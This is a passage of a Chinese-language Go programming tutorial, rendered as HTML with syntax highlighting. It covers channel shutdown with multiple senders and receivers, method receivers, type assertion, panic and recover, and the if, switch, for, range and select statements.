class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wgMain.Done()</span><br><span class="line"></span><br><span class="line">        stopper = &lt;-agentCh</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 唯一的调解者可以安全地关闭stopCh通道</span></span><br><span class="line">        <span class="built_in">close</span>(stopCh)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    sumSender := <span class="number">0</span></span><br><span class="line">    sumSendItems := <span class="built_in">make</span>([]<span class="type">int</span>, NumSenders)</span><br><span class="line">    wgSenders := sync.WaitGroup&#123;&#125;</span><br><span class="line">    wgSenders.Add(NumSenders)</span><br><span class="line">    <span class="keyword">for</span> i := NumSenders - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wgMain.Done()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j := Max; ; j-- &#123;</span><br><span class="line">                value := <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">0</span> &#123;</span><br><span class="line">                    wgSenders.Done()</span><br><span class="line">                    wgSenders.Wait()</span><br><span class="line">                    sumSender += sumSendItems[i]</span><br><span class="line">                    log.Println(i, sumSendItems[i], sumSender)</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 向中间调解者发送信号（非阻塞）</span></span><br><span class="line">                    <span class="keyword">select</span> &#123;</span><br><span class="line">                    <span class="keyword">case</span> agentCh &lt;- <span class="string">&quot;Sender#&quot;</span> + strconv.Itoa(i):</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> j &gt; <span class="number">0</span> &#123;</span><br><span class="line">                    value = i*Max + j</span><br><span class="line">                    sumSendItems[i] += value</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-stopCh:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">case</span> dataCh &lt;- value:</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sumReceiver := <span class="number">0</span></span><br><span class="line">    sumReceiveItems := <span class="built_in">make</span>([]<span class="type">int</span>, NumReceivers)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; NumReceivers; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wgMain.Done()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-stopCh:</span><br><span class="line">                    sumReceiver += sumReceiveItems[i]</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">case</span> value := &lt;-dataCh:</span><br><span class="line">                    <span class="keyword">if</span> value == <span class="number">0</span> &#123;</span><br><span class="line">                        <span class="comment">// 向中间调解者发送信号（非阻塞）</span></span><br><span class="line">                        <span class="keyword">select</span> &#123;</span><br><span class="line">                        <span class="keyword">case</span> agentCh &lt;- <span class="string">&quot;Receiver#&quot;</span> + strconv.Itoa(i):</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        sumReceiveItems[i] += value</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wgMain.Wait()</span><br><span class="line">    log.Println(stopper, sumSender, sumSendItems, sumReceiver, sumReceiveItems)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestRunMultiSenderAndReceiver</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">    runMultiSenderAndReceiver()</span><br><span class="line">    runtime.GC()</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="方法声明（method-declaration）"><a href="#方法声明（method-declaration）" class="headerlink" title="方法声明（method declaration）"></a>方法声明（method declaration）</h3><ul>
<li>类型扩展方法的两种形式：<ul>
<li>value 作为 receiver：<code>func (p Person) Value(name Person)</code><ul>
<li>只能读类型的值，不能改写它</li>
</ul>
</li>
<li>pointer 作为 receiver：<code>func (p *Person) Pointer(name Person)</code><ul>
<li>既能读类型的值，又能改写类型的值</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Point <span class="keyword">struct</span> &#123;</span><br><span class="line">    X, Y <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Point)</span></span> Distance() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Sqrt(p.X*p.X + p.Y*p.Y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Point)</span></span> Scale(factor <span class="type">float64</span>) &#123;</span><br><span class="line">    p.X = p.X * factor</span><br><span class="line">    p.Y = p.Y * factor</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    p0 := Point&#123;X: <span class="number">3</span>, Y: <span class="number">4</span>&#125;</span><br><span class="line">    p1 := &amp;p0</span><br><span class="line">    fmt.Println(p0.Distance(), p1.Distance()) <span class="comment">// 5 5</span></span><br><span class="line"></span><br><span class="line">    p2 := Point&#123;X: <span class="number">3</span>, Y: <span class="number">4</span>&#125;</span><br><span class="line">    p3 := &amp;p2</span><br><span class="line">    p2.Scale(<span class="number">2</span>)</span><br><span class="line">    fmt.Println(p2.X, p2.Y, p3.X, p3.Y) <span class="comment">// 6 8 6 8</span></span><br><span class="line">    p3.Scale(<span class="number">2</span>)</span><br><span class="line">    fmt.Println(p2.X, p2.Y, p3.X, p3.Y) <span class="comment">// 12 16 12 16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="类型断言（type-assertion）"><a href="#类型断言（type-assertion）" class="headerlink" title="类型断言（type assertion）"></a>类型断言（type assertion）</h3><ul>
<li>类型断言（type assertion）提供了一种将 interface 类型转换为其他类型的方式</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%T %v\n&quot;</span>, i, v) <span class="comment">// int 21</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%T %q\n&quot;</span>, i, v) <span class="comment">// string &quot;hello&quot;</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%T %v&quot;</span>, i, v) <span class="comment">// bool true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ToString</span></span><br><span class="line">    s := i.(<span class="type">string</span>)</span><br><span class="line">    fmt.Println(s) <span class="comment">// abc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ToByteArray</span></span><br><span class="line">    b := []<span class="type">byte</span>(i.(<span class="type">string</span>))</span><br><span class="line">    fmt.Println(b) <span class="comment">// [97 98 99]</span></span><br><span class="line"></span><br><span class="line">    run(<span class="number">21</span>)</span><br><span class="line">    run(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">    run(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="内建函数（built-in-function）"><a href="#内建函数（built-in-function）" class="headerlink" title="内建函数（built-in function）"></a>内建函数（built-in function）</h1><h2 id="panic-amp-recover"><a href="#panic-amp-recover" class="headerlink" title="panic &amp; recover"></a>panic &amp; recover</h2><ul>
<li>panic 和 recover 函数提供了一种处理异常和错误的机制<ul>
<li>panic 函数用于引发运行时错误</li>
<li>recover 函数用于捕获并恢复 panic 引发的错误，从而使程序能够继续执行<ul>
<li>只能在 defer 语句中使用，并且只能捕获最后一个未处理的 panic 错误<ul>
<li>如果存在多个 defer 语句，且都包含了 recover 函数，则只有最后一个 defer 语句会捕获 panic 错误</li>
</ul>
</li>
<li>如果 recover 函数在没有发生 panic 错误的情况下调用，则会返回<code>nil</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recoverFromPanic</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123; <span class="comment">// (catch run-time error)</span></span><br><span class="line">        fmt.Println(<span class="string">&quot;recover:&quot;</span>, r)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;recover:&quot;</span>, r)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> recoverFromPanic()</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;wrong&quot;</span>)     <span class="comment">// (raise run-time error)</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;end&quot;</span>) <span class="comment">// (unreachable code)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">recover: wrong</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h1 id="控制结构（control-structure）"><a href="#控制结构（control-structure）" class="headerlink" title="控制结构（control structure）"></a>控制结构（control structure）</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><ul>
<li>支持可选的初始化语句（类似 for）</li>
</ul>
<div class="tabs" id="cs-if"><ul class="nav-tabs"><li class="tab active"><a href="#cs-if-1">if</a></li><li class="tab"><a href="#cs-if-2">if-else</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cs-if-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// general</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cs-if-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">num := <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Even&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> num%<span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Divisible by 3&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Odd&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// with initialization statement</span></span><br><span class="line"><span class="keyword">if</span> num := <span class="number">10</span>; num % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">    fmt.Println(num, <span class="string">&quot;even&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(num, <span class="string">&quot;odd&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><ul>
<li>支持可选的初始化语句（类似 for）</li>
<li><code>switch &#123;&#125;</code>语法等同<code>switch true &#123;&#125;</code>，可用于代替复杂的 if-else 语法</li>
<li><code>v.(type)</code>语法可用于发现 interface 变量的动态类型</li>
</ul>
<div class="tabs" id="cs-switch"><ul class="nav-tabs"><li class="tab active"><a href="#cs-switch-1">General</a></li><li class="tab"><a href="#cs-switch-2">InitStatement</a></li><li class="tab"><a href="#cs-switch-3">TypeSwitch</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cs-switch-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Multiple values in a case</span></span><br><span class="line">num := <span class="number">2</span></span><br><span class="line"><span class="keyword">switch</span> num &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;One, Four, or Seven&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Two, Five, or Eight&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Expression in switch</span></span><br><span class="line">x, y := <span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">switch</span> x * y &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Product is 12&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Product is 15&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Unknown product&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// No expression in switch (replacing complex if-else chain)</span></span><br><span class="line">num := <span class="number">5</span></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> num &lt; <span class="number">5</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Less than 5&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> num == <span class="number">5</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Equal to 5&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> num &gt; <span class="number">5</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Greater than 5&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cs-switch-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> x := <span class="number">2</span> + <span class="number">3</span>; x &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;x is less than or equal to 3&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;x is 4&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;x is greater than 4&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cs-switch-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printType</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> t := v.(<span class="keyword">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Integer: %d\n&quot;</span>, t)</span><br><span class="line">    <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;String: %s\n&quot;</span>, t)</span><br><span class="line">    <span class="keyword">case</span> <span class="type">float64</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Float64: %f\n&quot;</span>, t)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Unknown type: %T\n&quot;</span>, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    printType(<span class="number">42</span>)</span><br><span class="line">    printType(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">    printType(<span class="number">3.14</span>)</span><br><span class="line">    printType(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><ul>
<li>循环只支持<code>for</code>，不支持<code>do-while</code></li>
</ul>
<div class="tabs" id="cs-for"><ul class="nav-tabs"><li class="tab active"><a href="#cs-for-1">General</a></li><li class="tab"><a href="#cs-for-2">InfiniteLoop</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cs-for-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Like C for</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="built_in">len</span>(a)<span class="number">-1</span>; i &lt; j; i, j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line">    a[i], a[j] = a[j], a[i]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like C while</span></span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i &lt; <span class="number">10</span> &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cs-for-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Like C for(;;)</span></span><br><span class="line"><span class="keyword">for</span> <span class="literal">true</span> &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="range"><a href="#range" class="headerlink" title="range"></a>range</h3><ul>
<li>range 可以用来遍历 array、slice、map 和 chan<ul>
<li>只迭代下标时，性能和普通 for 循环没有区别</li>
<li>迭代元素时，会创建元素的拷贝，当元素内存占用高时性能明显劣化<ul>
<li>将元素改为指针，可以避免迭代性能的劣化，且可以直接修改指针指向元素的值</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-for-range"><ul class="nav-tabs"><li class="tab active"><a href="#go-for-range-1">Basic</a></li><li class="tab"><a href="#go-for-range-2">Pointer</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-for-range-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Slice</span></span><br><span class="line">    ws := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> ws &#123; <span class="comment">// 只迭代index（与for循环性能一致）</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span> &#123;</span><br><span class="line">            <span class="comment">// 循环中修改切片，不在当前循环生效</span></span><br><span class="line">            ws = <span class="built_in">append</span>(ws, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(i, ws[i]) <span class="comment">// 0 a  1 b  2 c</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i, w := <span class="keyword">range</span> ws &#123; <span class="comment">// 迭代index和value</span></span><br><span class="line">        fmt.Println(i, w) <span class="comment">// 0 a  1 b  2 c  3 d</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Map</span></span><br><span class="line">    m := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;c&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">        <span class="built_in">delete</span>(m, <span class="string">&quot;b&quot;</span>)               <span class="comment">// 迭代过程中，删除还未迭代到的键值对（b和c），则该键值对不会被迭代</span></span><br><span class="line">        m[<span class="string">&quot;d&quot;</span>] = <span class="number">4</span>                   <span class="comment">// 迭代过程中，新创建的键值对，不一定会被迭代</span></span><br><span class="line">        fmt.Printf(<span class="string">&quot;%v: %v\n&quot;</span>, k, v) <span class="comment">// a 1  d 4  c 3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Chan</span></span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch &lt;- <span class="string">&quot;a&quot;</span></span><br><span class="line">        ch &lt;- <span class="string">&quot;b&quot;</span></span><br><span class="line">        ch &lt;- <span class="string">&quot;c&quot;</span></span><br><span class="line">        <span class="built_in">close</span>(ch)</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">for</span> s := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        fmt.Println(s) <span class="comment">// a  b  c</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-for-range-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// ForValue</span></span><br><span class="line">    ts := []<span class="keyword">struct</span>&#123; id <span class="type">int</span> &#125;&#123;&#123;id: <span class="number">1</span>&#125;, &#123;id: <span class="number">2</span>&#125;, &#123;id: <span class="number">3</span>&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, s := <span class="keyword">range</span> ts &#123;</span><br><span class="line">        s.id += <span class="number">10</span> <span class="comment">// range对每个迭代值都创建了一个拷贝</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ts); i++ &#123;</span><br><span class="line">        ts[i].id += <span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(ts) <span class="comment">// [&#123;101&#125; &#123;102&#125; &#123;103&#125;]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ForPointer</span></span><br><span class="line">    ps := []*<span class="keyword">struct</span>&#123; id <span class="type">int</span> &#125;&#123;&#123;id: <span class="number">1</span>&#125;, &#123;id: <span class="number">2</span>&#125;, &#123;id: <span class="number">3</span>&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, s := <span class="keyword">range</span> ps &#123;</span><br><span class="line">        s.id += <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ps); i++ &#123;</span><br><span class="line">        ps[i].id += <span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(ps[<span class="number">0</span>], ps[<span class="number">1</span>], ps[<span class="number">2</span>]) <span class="comment">// &amp;&#123;111&#125; &amp;&#123;112&#125; &amp;&#123;113&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><ul>
<li>select 语句用于同时等待多个 channel 的数据和事件<ul>
<li>每个 case 分支可以是 send、receive 或其他事件</li>
<li>如果多个 case 分支同时就绪，会随机选择其中一个分支执行</li>
<li>如果没有 case 分支就绪，会执行 default 分支或者阻塞等待</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-select"><ul class="nav-tabs"><li class="tab active"><a href="#go-select-1">ReceiveMultiChannel</a></li><li class="tab"><a href="#go-select-2">SendToBufferedChan</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-select-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">producer</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> producer(ch1)</span><br><span class="line">    <span class="keyword">go</span> producer(ch2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// blocking until ch1 &amp; ch2 occur received event</span></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> value, ok := &lt;-ch1:</span><br><span class="line">            <span class="keyword">if</span> !ok &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;ch1 closed&quot;</span>)</span><br><span class="line">                ch1 = <span class="literal">nil</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(<span class="string">&quot;ch1:&quot;</span>, value)</span><br><span class="line">        <span class="keyword">case</span> value, ok := &lt;-ch2:</span><br><span class="line">            <span class="keyword">if</span> !ok &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;ch2 closed&quot;</span>)</span><br><span class="line">                ch2 = <span class="literal">nil</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(<span class="string">&quot;ch2:&quot;</span>, value)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ch1 == <span class="literal">nil</span> &amp;&amp; ch2 == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">ch2: 0</span></span><br><span class="line"><span class="comment">ch1: 0</span></span><br><span class="line"><span class="comment">ch1: 1</span></span><br><span class="line"><span class="comment">ch2: 1</span></span><br><span class="line"><span class="comment">ch2: 2</span></span><br><span class="line"><span class="comment">ch1: 2</span></span><br><span class="line"><span class="comment">ch1 